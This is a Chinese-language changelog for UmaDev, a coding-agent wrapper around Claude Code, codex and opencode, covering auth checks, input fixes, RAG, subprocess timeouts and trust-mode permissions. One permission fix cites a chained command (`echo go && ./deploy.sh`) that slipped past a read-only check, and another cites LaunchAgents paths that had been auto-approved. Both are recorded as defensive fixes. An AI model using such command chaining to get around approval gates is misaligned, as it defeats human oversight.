- **doctor 检测缺失 `CLAUDE_CODE_OAUTH_TOKEN`(401)**:`claude login` 后 `probe_auth` 报 LoggedIn、doctor 就给 claude-code PASS —— 但 UmaDev 驱动的是**非交互** `claude --print`,它从 **env 凭证**鉴权,缺长效 token 时运行时返回 `401 Invalid authentication credentials`,此前没有任何检查在 401 前提示这个缺口。新增 `check_claude_noninteractive_auth`:claude-code 底座 + 无 headless 凭证(`CLAUDE_CODE_OAUTH_TOKEN` / `ANTHROPIC_API_KEY` / `ANTHROPIC_AUTH_TOKEN` / bedrock·vertex·foundry 变量)→ **WARN** + 指引("跑 `claude setup-token`、导出 `CLAUDE_CODE_OAUTH_TOKEN`");凭证在 → PASS 并点名变量;其它底座 / 无 → 信息性 PASS(不误报)。fail-open(WARN 非 FAIL,空 token 视为未设)。`run_all` 10→11 行。
- **复制 / 粘贴 + 输入卡死根治**:用户实测"无法 copy/paste",两个真因。**粘贴**:括号粘贴本身解码 / 插入正确,但有一处潜伏的 fail-closed 卡死 —— 当 reader 的 50ms lone-ESC flush 把 `…[201~` 结束标记**劈开**(巨量粘贴 / 慢管道 / UI 循环阻塞)时,显式 PASTE_END 匹配永不触发、`in_paste` **永真**,从此吞掉后续每一个键,输入框**整个死掉**(退格 / 方向 / ESC / 历史全失灵)。修复:两个 in-paste 追加分支都 `close_paste_if_terminated`(括号粘贴会剥掉正文里字面的结束标记,故累积缓冲里残留的结束标记只可能是真终结符 —— 剥掉并闭合,字符边界守护,从不 panic)。**复制**:输入框确实拖不动复制(拖选层 `screen_to_content` 在转录区外返 None),逃生口(Shift+drag / `/mouse`)又只在 `/mouse` toast 里提过(死循环);加一次性三语提示(`native_copy_hint_shown`),在转录区外开始拖拽时触发指向 Shift+drag + `/mouse`,真实转录选择时静默。

### 修复 — 自审硬化

- **本地 fp16 语义层此前默认安装上静默全死(384 vs 1536 维)**:本地模型出 **384 维**向量,但 `VectorStore` 把 `dim` 烤成 `active_dim()`=1536(HTTP 模型默认),于是 search **拒掉每个** 384 维查询、且维度守卫(1536==1536)抓不到 —— **每次 npm install 都静默只跑 BM25**,宣传的本地语义层从未贡献,fail-OPEN / 隐形。修复:`store_dim()` 用**实际**嵌入宽度(`vecs[0].len()`)给 store 打标;在 vector-local 下 `active_dim()` 读本地后端的真实 `hidden_size`(`config.json` 的 `local_dim`),store + 缓存失效守卫端到端在 384 一致 —— 本地 fp16 RAG **真正可用**(对真 384 维模型实证)。另:进程级 `OnceLock` 缓存 `(BertModel,Tokenizer)`(~220MB 只加载一次,不再每查询多秒卡顿);形状有效但下标越界的 `bm25.bin` 重建而非 panic(原为 fail-closed);RRF 确定性 tiebreak;cosine 把 NaN/inf 钳到 0;schema 版本号在升级后让旧缓存失效;纳秒 mtime 关同秒编辑陈旧窗。
- **宿主每个子进程 await 有界(防泄漏孙进程卡死借脑)**:最终 `stderr_task.await` 是无界 `read_to_end` —— 一个继承底座 stderr fd 的**孙进程**在底座退出 0 后仍持管道、`complete()`/`probe()`/`consult()` **永久挂起**(build / `verify --runtime` 真实可遇);现 stderr 经 256KiB 上限循环捕获、最终 await 由 2s flush 宽限封顶、超限即中止。流式 `child.wait()` 此前无界 → 包进超时 + start_kill;`>64KiB` 提示与排干并发避免死锁(codex);fork 探测由专用超时封顶(10s)、超时退只读 resume 兜底;opencode 长 server stdout reader 后台 drain 保活整个会话(不再因 64KiB 管道塞满 EPIPE 杀 server)。另:codex 事件通道有界 `try_send`、行 reader 用 `read_until`+`from_utf8_lossy`(一个非法 UTF-8 字节不再=EOF 假报"底座异常结束")。
- **聊天面真 UI/greenfield 构建强落评审团 + 门**:`brain_to_route` 在空复杂度上默认 depth=Fast、`reconcile_team` 在 Fast 返回空地板团队 —— 聊天里建的网站**裸底座零评审**就发货。现 PRODUCT 类构建(Greenfield/Frontend/Backend)强制 depth≥Standard + 用与 `/run` **同一** `tier0_team`(含 build_ships_ui 救援)定团队,而文档 / 轻量 / bugfix 回复仍比例 Fast。配套修:源码存在性地板(0 字节 / 纯注释 stub 不再伪报有源码,`is_nontrivial_source` 要求非空白非注释 token)、plan 路径 `finalize` 加 `clean` 参数(阻断的构建不再出 proof-pack / 成绩单)、预算用尽优雅收尾、商务名词(电商 / 商城 / shop / ecommerce…)纳入重型信号、裸 agent/prompt 要求 AI 共现。
- **Plan/Guarded 信任漏洞**:`is_read_only_command` 用 `starts_with` 把 `echo go && ./deploy.sh` 当只读、Plan 自动放行 —— 现任何 shell 分隔符 / 重定向 / 替换即非只读(Shell/Network 在 Plan 下需确认),读动词只匹配首 token。`target_escapes_workspace` 此前是无工作区认知的反向 denylist —— Guarded(默认)自动放行 `/Library/LaunchAgents`、`/opt`、`/var`、其他用户目录;现改**工作区根感知**(不在真实根下的绝对路径即逃逸),根透传进 `requires_confirmation_with_ledger` + `remember_project_approval`。
- **治理内核 fail-open 真兑现 + 假阳修正**:`run_check_guarded` 把每个 per-check 调用包进 `catch_unwind(AssertUnwindSafe)` —— **panic 的规则产出 `Decision::pass()`**(fail-open 契约化执行,而非仅约定)。颜色假阳 / 绕过:hex 正则收到精确 CSS 颜色长度(#3/4/6/8)、非词左边界 + HTML 实体 + 属性内短 hex(`href="#abc"`)跳过、补 `oklch/oklab/color-mix` 与 CSS 值上下文的命名色检测(不误伤 JS 对象)。emoji 放过印刷字形(U+2308-230B 等)仍拦彩色 emoji;ai-slop 放过 test/fixture/mock/story 路径;`audit.rs` 轮转用 `O_CREAT|O_EXCL` 锁 + 锁内复检串行化(竞争的 hook 进程不再双轮转 + 误删 SOC2/ISO 记录)。
- **TUI 生命周期**:cancel-drain 的 `timeout(2s)` 此前在每 80ms 的 `select!` tick 内联重建、截止从零重启、永不触发 → 中止后未命中 await 的任务把 UI **永久卡在"停止中"**;现用 `timeout_at` 对一次性捕获的**绝对** `cancel_deadline`。停在半途的 steer 在错误中止 / 用户取消时无排干路径 → 假亮的 `queued N` chip 永留;现 `mark_block_aborted` 排干 + surface、`cancel_run` 清掉。`run_bang_command` 用 `Command::output()`(缓冲到 EOF、超时不杀)→ `!yes` / `!tail -f` / `!npm run dev` OOM + 孤儿;现两路都经 256KiB 上限 per-thread reader、10s 截止杀 + 回收、`stdin=null`。另:`insert_str_at_cursor` 保留 `\t`(粘贴的 tab 缩进代码不再丢缩进);legacy-input EOF 不再忙转;`rewind_to_last_user_message` 截断**完整转录**(不只可见历史);选择 / 搜索匹配行在 `MAX_RENDER_ROWS` 前段 split_off 后重基。
- **契约门不再对描述性表头空过**:API 表契约门(UD-CODE-003)此前**空过** —— `extract_endpoints_from_table` 用宽松 `contains` 找到表头、却用精确 `==` 解析 Method/Path 列,于是 `HTTP Method | API Path` 表头命中却零列 → 空 `ApiSpec` → 前后端门报零端点 + 啥也没做就过;新增 `col_any`(contains)+ 同义词(method/verb;path/endpoint/url/route)。另:`render.rs` 给 YAML 保留标量(No/true/yes/~/null/数字样)加引号(描述 `No` 不再在 openapi.yaml 里重解析成 false);`extract.rs` 用 `symlink_metadata` 跳符号链接;`mcp.rs` 字节级 `read_until` + 1MiB 上限 + lossy + 重同步(一行非法 UTF-8 答 -32700 而非杀会话);`main.rs` `project_root_or_cwd` 替掉会 panic 的 `current_dir().expect()`。

## [1.0.16] — 一个模拟真实开发团队来工作的 Coding Agent · 记忆不丢(双保险)· 写文档不再烧全流程 · 开发团队架构做实(Wave A/B/C)· 深读 Claude Code 源码落地一大批

系统深读 Claude Code 完整源码 + 互联网商业级工程研究并落地一大批强化;以**双保险**根治用户实测的**记忆丢失**、以 **brain-first 文档定规模**根治**写文档烧 token**;把"开发团队"从概念做成可见的运行架构(Wave A/B/C);并重定位为**一个模拟真实开发团队来工作的 Coding Agent**(八角色各干各的活、协调者只负责调度)。

### 新增 — 记忆不丢(双保险)

- **持久项目事实记忆(双保险之一)**:新增 `.umadev/memory/facts.jsonl` —— 底座发现的项目事实(JDK17 在哪个路径、构建 / 测试命令、环境约束)每轮注入**固件头部**,无论转录被裁剪还是底座自己上下文轮换都还在,从此**永不重新查找**(根治用户实测的"记了又重查")。
- **token 预算自动压缩(双保险之二)**:超预算时把早期轮次在**只读 fork** 上做**结构化摘要**(意图 / 涉及文件 / 关键决策 / 错误修复 / 待办 / 当前工作),近期尾巴**逐字保留**,替掉过去有损的 **16 条 FIFO + 160 字 `/compact`**;完整逐字转录始终**落盘保全**、`/resume` **无损还原**、连续 3 次摘要失败即**熔断 fail-open**。

### 新增 — 开发团队架构做实(Wave A/B/C)

- **Wave A 智能席位建造**:完整构建按 `RoutePlan.depth.is_deliberate()` 自动**逐角色真建造**(产品 → 架构 → 设计 → 前后端 → QA → 安全 → DevOps,每角色真建自己那摊),小任务仍走**单轮便宜路径** —— router 自动判,不让用户选。
- **Wave B 角色真产物**:`design-tokens` 升为**一等交付物** + `DesignTokensPresent` 验收;**契约优先 DAG**(前后端依赖架构师先定的契约);**QA 先写测试**(测试作者≠代码作者,结构性去偏)。
- **Wave C 团队可见**:实时**花名册面板**(每个席位 + `idle/working/reviewing/blocked/done` 状态)+ **交接时间线** + 团队**章程**(`/constitution`)+ `/team`;**反剧场铁律** —— 没有真实产物的席位不显示。

### 新增 — 深读 Claude Code 源码 + 商业级研究落地

- **测试完整性守卫(UD-QA-001)**:确定性地板检测删测试 / 弱化断言 / 加 `skip` 或 `xfail` / 注释掉 / 改测试框架配置**骗绿**,不再轻信绿色信号、**有界打回** —— 反"为了过线而黑掉测试"。
- **信任档 mode-aware + 自学习**:`Plan / Guarded / Auto` 三档在**工具调用级**真区分;**不可逆动作**(`.git` / 网络 / 破坏性 shell)每档都强制二次确认;"记住此决定"可**持久化**,同类动作下次免问。
- **TUI 性能**:新增 **settled 渲染缓存 + 事件合并**,长会话不再每帧重新解析整段历史,**治本**长会话发沉 / 流式卡顿。
- **可恢复编辑 + 字素簇光标**:kill-ring + yank,`Ctrl+U/K/W` 删除内容**可恢复**、不再不可逆丢字,**撤销 / 重做** `Ctrl+Z`;光标按**字素簇**移动删除,ZWJ emoji / 组合符当作**一个单位**、不再被劈裂;大段粘贴折叠成 chip。
- **一批交互成熟度补齐**:重试可见(退避前显示倒计时、空闲挂死自动重驱一次)· 任务持久化(`/tasks` 重启可重连)· 版本化配置迁移器 · 完成响铃 · `Ctrl+F` 转录搜索 · 上下文 / 花费仪表 · 双击 Esc 回退重发 · `!` 内联 shell · 快捷键速查。
- **自进化两项**:**首过验收率**(按路由类 / 步骤类记录廉价路径一次过验收、不返工的比例,某类偏低则该类多咨询 / 降自主)· **爆炸半径验证排序**(按 DAG 下游依赖数加权排验证与返工 —— 上游 schema / 契约错了会拖垮全部,优先验)。

### 新增 — 能力 + 知识库

- **MCP 扩到 6 工具**:新增 `plan_status` / `contract_check` / `lessons_recall` / `governance_summary`(只读 fail-open)· **PostToolUse 审计钩子** · **自定义团队角色**(`.umadev/agents/*.md`)· **后台运行 + `/tasks` 任务注册表**。
- **知识库四波 +32 份商业级标准**:EARS 需求 / 契约优先 / 测试纪律 / 反造假 / AI-slop 失败模式目录 / 验证器模式 / 上下文工程 / eval 驱动交付 / 分级就绪记分卡 / 可观测 SLO / 供应链卫生 / 无障碍验收门 / 生产就绪评审 等;并**隐私洁净化** —— 清掉散落 **79 个文件**的个人邮箱 + **77 个**垃圾模板标题。

### 修复

- **写文档不再烧 token**:借底座大脑先判"**写一份文档 vs 做文档描述的那个产品**" —— 写 PRD / 设计文档 / 调研报告是**轻触**(至多 1 席 PM 过目),不再上 8 席团队 + 多轮评审 + 完整流程;真做文档平台 / 产品的构建**一字不变**(`has_heavy_signal` 守住)。并修了**源码存在性地板** —— 它过去对纯文档伪报"无代码失败"、逼底座去写本不需要的代码白烧多轮,现已**文档感知**。根因:之前脑判了意图却仍用关键词表给构建定规模,现在**大脑定规模为主、关键词只兜底**。
- **底座 / 交互一批修复**:底座空闲 **300s 误杀** → 改活性判断(在跑工具且底座活着就一直等)· **中止后状态同步** · 路由失败后**"继续"不再重头查询**(底座活着留住会话)· 工作时**屏幕闪烁**(同步输出 gate)· **中文吞字**(宽 emoji 的 turn 标记错位、`U+FE0E` 钉死)· **stderr ANSI 乱码剥离** · **滚轮拖选复制更多** · **多目录串台隔离**(config 临时文件加 PID)· **API 报错不再静默**(限流 / 鉴权 / 网络 / 过载显真实文案 + 可操作提示)· codex `/sandbox` 可配 · 删掉多余的 `/claude-code` 别名。

### 变更

- **定位重写**:全仓库 + 官网统一重定位为"**一个模拟真实开发团队来工作的 Coding Agent**" —— 八角色各干各的活当**主角**、协调者只负责调度,不再以单一总监为头牌;版本徽章改为滚动 `1.0.x`。

> 本条目合并了 1.0.7 之后的累积变更。

## [1.0.7] — 借脑智能路由 · 删掉 chat/run 分裂（真实构建即全套）· 统一 always-on 系统 · 持续会话提速 · 三底座 /goal · 知识库嵌二进制 · 终端渲染对标 ·（含顶级真 Agent 化 Wave 1–6 + 持续会话总监 + 聊天防幻觉）

把"持续会话总监"落地成**用户真能看见、能操控、能信任**的顶级总监 Agent，并完成本轮三大跃迁：①底座**借脑判定**每条输入（不再关键词表）；②**删掉 chat vs /run 分裂**——触发重型系统的是**真实构建**而非键入命令，聊天里键入的构建拿到与 `/run` **一模一样**的全套旗舰系统；③**终端渲染对标 Claude Code**（真 markdown / 实时 diff 卡 / 完成卡 + 预览 URL / 工具行折叠 / 流式）。权威产品态见 [`docs/PRODUCT_VISION_AND_ROADMAP.md`](docs/PRODUCT_VISION_AND_ROADMAP.md)。9 阶段商业链是总监为**重型 greenfield 构建**路由到、计划展开成的**最深一招**，不是每条消息被迫穿过的漏斗。

### 新增 — 本轮真 Agent 化（借脑路由 · 统一系统 · 提速 · /goal · 知识库 · 终端渲染）

- **借脑智能路由（不是关键词表）**：默认聊天面**借底座的大脑**判定每条输入——聊天 / 解释 / 小改 / 调试 / 构建。底座自己的模型判，**权威**；大脑不可达 → 走最轻路径，绝不关键词猜测。`route_via_brain` 一次性无状态 triage，结果驱动分发；底座也**用行动判**聊天 vs 构建——一次聊天轮里**首个改写工作区的文件写**会反应式地把它升格为构建。修掉真机实证里的误判（"你好,你是谁"召唤 7 席团队、"改个标题"被当 Build）。
- **删掉 chat / run 分裂（真实构建即全套）**：触发重型系统的是**真实构建**，不是键入的命令。此前驻留聊天路径绕过四大重型系统（设计 slop 扫描 / 角色裁判团 / 知识+lessons 召回 / 自进化捕获）——它们被锁在 `/run` 后面，导致聊天里建的网站**裸底座单飞、零评审**。现在 `react_to_first_write` 一把聊天轮翻成构建（`became_build`），`run_post_build_qc`（复用 `/run` 收尾的**同一**地板）立刻触发：治理 + 设计 slop 扫描、角色裁判团评审、带证据的有界返工（知识摘要 + 召回踩坑前置到修复指令）、用量 + 踩坑捕获。纯聊天回复（无文件写）完全跳过、保持轻快。`/run` / `/goal` 保留为显式入口，不是另一套代码路径。
- **统一 always-on 系统**：每个真实构建（聊天升格或 `/run`）都拿到——**设计系统 / 反 AI-slop 法**（每个干活轮**永远在**的静态法条，零延迟成本，从 Full-only 放宽到任意 `wants_craft` 档位，聊天升格的构建也写真 UI）、构建后治理 + 设计 slop 扫描、角色**团队**评审（PM / 架构 / UIUX / 前端 / 后端 / QA / 安全，只读 fork、advisory）、**知识摘要**（商业工程标准）、**自进化**（记踩坑、召回 lessons 进返工）。Fast 构建召集**最小 UI 团队**（设计师 + 前端 + QA），deliberate 构建召集全队。
- **持续会话提速**：聊天跑在**一个驻留底座会话**上，启动即预载——根因是旧聊天路径用 `Runtime::complete_streaming` = 每条消息开一个全新底座进程、每轮重载 MCP + 重注固件（首回 30-60s 冷启动）。现 `spawn_chat_session_preload` 在到达聊天的瞬间**离线程**开持久 `session_for`（claude/codex/opencode 三家长驻），底座 + MCP + 固件**只加载一次**（趁用户读欢迎屏），每条消息在**温会话**上 `send_turn` + drain。**首回复不再扛 30-60s 冷启动**。
- **三底座 `/goal`**：新增 `/goal <objective>` 驱动目标驱动构建，让借来的大脑**持续干到目标达成**，带完整统一系统 + wall-clock 预算（默认 30 分钟，已落地）。claude / codex / opencode **三家都声明** `persistent_goal=true`、走原生持久 `/goal` 模式；`UMADEV_NO_GOAL_MODE=1` 可关，fail-open。`/run` 与 `/goal` 共用同一 preflight（硬化交互一致）。
- **知识库嵌进二进制**：召回早已接线（聊天构建 + `/run`），但读的是**空语料**（只找项目本地 `knowledge/`，用户机器上没有）。现用 `include_dir!` 把整棵 `knowledge/` 树（5.5M / **418 文件**）嵌进二进制，启动时 `knowledge_bundle::ensure_staged()` **一次性**抽到 `~/.umadev/knowledge`（版本标记、当前则跳过、清孤儿）+ 设 `UMADEV_KNOWLEDGE_DIR`，`knowledge_root` 加该回退。零配置、fail-open，商业工程标准从此**抵达每个用户项目**。二进制 9.5M→13M。
- **终端渲染对标 Claude Code（大幅可见升级）**：
  - **真 markdown**：pulldown-cmark → ratatui 编译器替代逐行 `strip_prefix` hack——标题 / **粗体** / 斜体 / 删除线 / 链接（并**surface 出 URL**，终端点不了就显示目标）/ GFM **表格**（unicode-width CJK 安全对齐、按列左右居中、宽于视口按比例缩列 + 截超长格、≥3 列且预算太窄时退化成 `表头: 值` 竖排记录）/ 嵌套列表（深度算 marker + 缩进）/ **任务清单复选框** `☑/☐` / 引用块 / 围栏代码（无 regex 的逐语言高亮 + 代码底色）。裸 `http(s)://` 自动链接。词边界软换行（窄非空字符成不可断单元整体下移、CJK 仍逐字）。全程 fail-open（`catch_unwind` → 纯文本）。
  - **实时 diff 卡 + 词级高亮**：文件 Write/Edit 渲染成**实时 diff 卡**——固定宽 gutter（右对齐行号 + `+/-/空格` 标记）、`similar` 求 ±3 上下文 hunk、**仅变动的 token 高亮**（每对 `-`/`+` 跑 `TextDiff::from_words` 逐位配对、只点亮变动字节区间，不再整行红绿块；近乎全改才整行高亮）、按文件扩展名语法高亮、虚线 `┄┄` 边框、整行 add/del 底色染（CJK 安全、绝无裸色）。超 24 行默认折叠 + Ctrl+R 展开。三家 fail-open（claude 全 old/new；codex 仅路径 → 退普通行；opencode gutter-scrape → 退普通行），且接到聊天默认面（director_loop / continuous / tui）。
  - **完成卡 + 自动 surface 预览 URL**：构建有效完成时推**「构建完成」卡**——变更文件（git porcelain）+ 关键入口 + 运行命令；web 项目复用 `/preview` 机制后台起 dev server，渲染可点 `预览: http://localhost:PORT`。覆盖聊天 / Fast / 反应式构建，纯聊天不出卡。fail-open（非 web/未检测 → 只出卡、不起 server、不阻断、无进程泄漏）。
  - **结构化工具行 + 折叠**：`ChatMessage.body:String` → `kind:MessageBody{Text, Tool}`，工具调用渲染成 `[状态字形] [名 粗体] [dim (arg)]` + 结果在 `⎿` dim gutter（排队 / 运行 spinner / 绿 ok / 红 fail）；低信号 Read/Grep/Glob **合并**成一行（取最大计数防流式回跳），grep 折成 `(N matches)` 指标而非裸 dump；只读工具成功**不再 dump** 200 字预览（行已点名目标）。Host 正文或工具结果超 20 行折叠成头-N + `… N more · Ctrl+R 展开`。Read surface 行窗口（`L10-14`）、Grep/Glob surface 搜索域（`pattern · src/`）。
  - **流式打磨**：稳定前缀缓存——流式回复只重渲未闭合尾块（998 行回复 O(n²) 整体重解析 → O(尾)/帧，逐字节等价于一次性整渲）；sticky-to-bottom（钉底跟新 token、上滚则守读锚）；thinking 折成一行 `正在思考… · 4.2s`；统一 spinner（共享 braille 帧 + **微光**扫过 thinking 字、停滞/关动画则定格，无频闪——可访问性 + 诚实）；高亮 512 项 thread-local LRU 缓存。
- **术语**：用户可见文案 "AI 工人 / 工人" → "底座"（我们驱动的底座 CLI 是用户的**底座**，不是 worker），zh-CN + zh-TW。
- **空输入光标修复**：空输入时光标不再压住 placeholder 首字（占位符右移一列让光标块独占一格）。

> **诚实标注（实现 vs 路线图）**：每个阻断项的*类型化 `BlockerDisposition`*、`error_kb` *配方查表*、*指纹去重* stuck-detector 仍是 **L3 路线图目标**，尚未落地——**已落地** = 有界 gap/stall 计数器 + 召回 lessons + 带证据返工；wall-clock 构建预算（默认 30 分钟）**已落地**。9 阶段强制链是总监路由到的**最深一招**，不是产品的定义性数字。

### 新增 — 顶级真 Agent 化（Wave 1–6）

- **W1 — 它会想、会拆计划、还给你看**：新增三个自有原语。**智能路由**（`umadev-agent/src/router.rs`）把每条非斜杠输入分流成 `RoutePlan{class,kind,depth,team,scope,…}`（确定性 Tier-0 地板 + 可选 fork 出的只读结构化 JSON 借脑判断，借脑只能升级深度、绝不悄悄降到安全地板以下），结果以**意图卡**显示（"小改动，这就做" vs "完整产品，进研发流程"），`/run` 强制完整、`/quick` 强制快路径可覆盖。**自有可视计划**（`plan_state.rs`）把目标拆成总监自己解析并持有的依赖 DAG（落 `.umadev/plan.json`），渲染成**实时勾选清单**（退役"卡在 0/9"的冻结相位条），`/plan skip|add|veto|up|down <id>` 步级调度。新增 4 个引擎事件 `IntentDecided` / `PlanPosted` / `PlanStepStatus` / `CriticVerdict` 并在 TUI + CLI 渲染。首启选择器**说真话**：三态认证探测（已登录 / 装了没登录→登录命令 / 没装→安装命令），未登录的底座不再假绿、阻止提交。
- **W2 — 真带团队 + 真固件**：新增 `context::compose_firmware`——一个分层、token 预算的系统提示构建器，在**每条路径**注入身份 + 反 AI 模板心法 + JIT 知识摘要 + 按技术栈指纹召回的踩坑（过去只在 `runner.rs` 触发），经 `session_for`→各底座原生系统提示面注入（claude `--append-system-prompt`；codex/opencode 作首条指令前缀，诚实标注）。计划被 **`director::summon` 真驱动**（不只是显示）：可调度的 Build 步串行 summon、Review 步 fork 团队并行审；团队规模在**每条路径**按 `RoutePlan.team` 缩放（不再 `/run`-only）。用量 + 审计（`record_tool_call`）+ 踩坑捕获/召回接进默认 `director_loop`——`/lessons`、`/usage`、审计在发布路径上对**三家底座**都真了。
- **W3 — 它懂你的代码库**：新增 `umadev-knowledge/src/repomap.rs`——依赖极轻的逐语言正则符号扫描（JS/TS/Py/Rust/Go/Java/Kotlin/C#/PHP/Swift/Dart/Ruby，函数/类/接口/枚举/导出 + file:line），按度中心性近似排名、按 `RoutePlan.scope` 个性化，渲染成 token 预算的符号轮廓，mtime 缓存到 `.umadev/repomap-cache`，**零新增传递依赖**（纯 Rust regex，守住依赖极简反规则）。这片 repo-map 切片经 `compose_firmware` 在每条干活路径（含 "explain this code"）注入底座；greenfield/空仓→空→零开销。增量 verify：底座自己刚跑过且报告干净的构建/测试，`run_auto_qc` 信任它、不再重复跑一遍。
- **W4 — 它交付证明、也自验**：`director::finalize`（从 `phases.rs` 抬出）在质检通过后产出 PRD/架构/UIUX/成绩单/proof-pack，**按深度裁剪**（轻量页面不塞 proof-pack）。验收地板（覆盖 FR→step + 验收 task→API + 契约校验）提升到默认 deliberate 路径，不再 legacy-only；bugfix 要求复现测试红→绿 + 回归保持绿。自纠错折进**带证据的具体修复指令**（原始失败测试/stderr）+ 召回踩坑 `lessons`，并由**有界 gap/stall 计数器**干净退出为 `Blocked{reason,evidence}` 而非空转（每个阻断项的*类型标签* + `error_kb` *配方查表* 与*指纹去重* stuck-detector 是 L3 目标，尚未落地——见 `docs/PRODUCT_VISION_AND_ROADMAP.md` 的实现状态说明）。自有基线 SAST（`rules` 引擎的 `sast_scan_file`：注入 / 缺鉴权 / 硬编码密钥启发式）让安全扫描免工具出结果。
- **W5 — 它记得住、你能和它对话**：UmaDev 每轮把自己**有界的对话**（6k token 预算）发给底座（`--resume` 退化为双保险，不再是唯一记忆）；**持久化 + 续接**每项目对话到 `.umadev/chat/<id>.json`（原子写），`/sessions` 列、`/resume <id>` 续、`/compact` 按 token 预算总结折叠（替代 FIFO-16 截断）。chat ↔ `/run` **共享记忆**：一次 build 结束后会话交回 chat，"你为什么这么建？" 续在同一会话。跨会话目标续接：启动时若 `.umadev/plan.json` 有未完成计划，问"继续目标 X（第 N/M 步）？"。离线 chat 不再静默——上下文感知兜底回声 + 指向连接底座。
- **W6 — 可信、清晰、一致**（本轮文档批次）：文档/规范/README 三方对齐到当前真实产品——确立 director/USB 模型 + Router/Plan/Scheduling 为 canonical，把 9 阶段强制链降级为"总监为完整商业级 build 选择的最深一招"。

### 文档

- **README.md** 重写"UmaDev 如何工作 / 团队怎么协作 / 流水线设计"：以真实流程为主线——智能路由（意图卡）→ 可视计划（实时清单）→ 注入固件 + 代码库理解 → 逐步调度团队 + 每步验收 → 交付证明 → 记忆；9 阶段降级为"最深一招"。新增"大概要多久 · 命令怎么发现"一节（时间量级表 + 命令可发现性）。命令表补齐 `/quick` / `/plan` / `/sessions` / `/resume` / `/compact`。诚实标注已实现 vs 路线图。
- **spec/UMADEV_HOST_SPEC_V1.md**（draft.5）：新增 §9.5（director 驱动的轮次模型：route → plan → schedule → deliver）+ 在 §4.1 厘清 `UD-FLOW-001` **作用域**——9 阶段链是 `standard` profile 的**完整商业级 build**（总监路由到、计划展开成的最深一招），不是每条输入的固定漏斗。**非规范变更**：未新增/修改/重排/弱化任何条款，`UD-FLOW-001` 对它治理的那次 build 仍是 MUST；与 CLAUSES 锁步测试保持绿（14/14）。
- **docs/** 理顺权威关系：`AGENT_WIELDS_BASE_ARCHITECTURE.md` 标注**被 VISION supersede**（保留为 director/USB 模型的概念起源，其四波迁移路线已落地）；`CONTINUOUS_SESSION_ARCHITECTURE.md` 标注会话机制仍现行、但 router/plan/调度叠加在其上、9 阶段应读作"最深一招"；`ARCHITECTURE.md` / `USER_GUIDE.md` 更新定位指向 VISION 为权威。
- **CLAUDE.md** "What this project is" 与 crate 表对齐真 Agent（router/plan_state/context/director/repomap/finalize），不再说"9-phase runner is core"；9 阶段标注为"最深一招"。

### 变更 — 持续会话总监 + 完整团队架构（驱动模型大版本变更）

UmaDev 的底座驱动模型从"每阶段单发"重构为"一个持续存在的项目总监 Agent，带领一支完整团队交付"。这是产品叙事与运行时行为的一次大版本对齐。

- **总监架构简化为 USB / 智能硬件模型（拆掉标记调度协议）**：把"底座发 `<<<umadev:summon/review/verify/checkpoint>>>` 标记、UmaDev 解析中介召唤团队"那套**退役**。UmaDev = 纯固件（资深团队总监身份 / 工程心法 / 知识 / 治理 / 记忆），插进底座借它的大脑+身体干活——底座本身就是完整 Agent，注入固件后**它自己内部**扮演 PM/架构/前端/QA 端到端把活干完，不需要外部协议召唤团队。`director_loop` 从"标记中介"改成"**底座端到端 build → UmaDev 自动质检（只读诚实硬门 + 可选 fork 评审）→ 有问题反馈给底座的身体去改 → 有界循环（`MAX_QC_ROUNDS`）**"。UmaDev 不再长出"自己操作"的部分：造代码/写文件/跑构建测试/改 bug 全是底座的身体用它自己的工具干；UmaDev 只做两件极小的固件本分——治理安全网（已有 hook）+ 读磁盘确认真有代码的诚实校验（`acceptance::source_files`）。`summon/review/verify/checkpoint` 保留为 UmaDev 内部可调的 Rust 能力（质检用），但不再作为底座可见的标记协议。固件注入（身份/心法/知识）保留强化（`experts::director_with_team_tools` 现只组合身份+心法，不教任何标记语法）。护栏全保：单写者 / 硬门 / 审计 / 治理 fail-open / 不持端点 / `UMADEV_LEGACY_PIPELINE=1` 仍走旧流水线。
- **持续会话成为默认驱动模型**：整条 9 阶段流水线复用底座的**一个持续会话**（claude-code 走 stream-json 双向流、codex 走 `app-server`、opencode 走 `serve`），上下文全程在线、底座连续用工具真写代码。过去"每阶段单发"（`claude --print` / `codex exec` / `opencode run`）退役为 **fail-open 兜底**——仅在会话起不来、离线底座、或显式 `UMADEV_CONTINUOUS=0` / `UMADEV_LEGACY_RUN=1` 时启用。新增 `BaseSession` 抽象（`umadev-runtime`）+ 三家会话驱动（`umadev-host` 的 `*_session.rs`）。
- **统一意图驱动**：闲聊、临时任务（"审这段代码" / "改个 bug"）、完整需求不再是三套割裂代码路径，而是同一总监 Agent 对同一持续会话的不同驱动，共享同一份记忆与上下文。底座自己判断聊天 / agentic / 跑流水线；只有改文件的活才占单写锁与门机制。
- **顶级团队作为可调度角色席位**：产品经理 / 架构师 / UIUX 设计师 / 前端 / 后端 / QA / 安全 / 运维 + 总监。干活角色串行写主会话；评审角色各自 `fork()` 出只读分叉会话**并行**审，返回结构化 `RoleVerdict`。角色之间不互相聊天——只通过共享文件黑板（`output/*.md` + 源码）与裁决沟通。总监确定性汇总：阻断项折成一条返工指令注入主会话，gap-count + stall-counter 有界终止。团队规模随任务复杂度缩放（bugfix 不组队、greenfield 全队）。
- **护城河不变**：fail-open 治理（每次文件写实时拦截）· 确定性控环（底座 + critic 只 advisory，门 / 退出码 / 零代码硬门是硬信号）· 不持有模型端点 · 审计证据（含 `team-ledger.jsonl`）· 自我进化记忆（踩坑库 + 信念层 + 矛盾卫生 + 反思 + 信任分级 + CJK 检索）· 三语。

### 文档

- 重写对外叙事：`README.md` 主线改为"AI 项目总监带队交付"，新增"团队怎么协作 / 为什么可信"两节，运行模式表与流水线表标注持续会话与各阶段主导角色。
- `spec/UMADEV_HOST_SPEC_V1.md` 新增 §9.3（持续会话驱动模型）+ §9.4（团队协作模型）散文，描述参考实现如何用一个持续会话驱动全程、如何把 `UD-FLOW-007` 落地成总监带队 + 共享黑板。**非规范变更**：未新增 / 修改 / 重排任何条款，仅引用既有条款，与 CLAUSES 锁步测试保持绿。
- 项目 `CLAUDE.md` 的"What this project is"更新到持续会话 + 团队叙事。

### 修复 — 聊天防幻觉（锚定 git 真相）· run 不再卡死 0/9 · 安装 PATH 兜底

